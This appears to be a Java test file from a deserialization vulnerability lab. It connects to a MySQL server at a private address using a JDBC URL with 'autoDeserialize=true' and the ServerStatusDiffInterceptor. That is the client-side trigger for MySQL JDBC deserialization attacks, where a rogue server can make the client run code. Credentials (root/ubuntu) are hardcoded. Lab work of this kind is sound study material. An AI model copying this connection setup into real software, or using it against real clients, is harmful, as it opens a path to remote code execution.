package MySQLJDBC;

/**
 * @author mody
 * @title: MysqlJdbc5Test
 * @projectName Java_deserialize_vuln_lab
 * @description: TODO
 * @date 2020/3/244:07 PM
 */

import java.sql.Connection;
import java.sql.DriverManager;

public class MysqlJdbc5Test {
    public static void main(String[] args) throws Exception{
        String driver = "com.mysql.jdbc.Driver";
        String user = "root";
        String password = "ubuntu";
        String url = "jdbc:mysql://192.168.44.1:3306/mysql?characterEncoding=utf8&useSSL=false&statementInterceptors=com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor&autoDeserialize=true";
        Class.forName(driver);
        Connection conn = DriverManager.getConnection(url, user, password);
    }
}
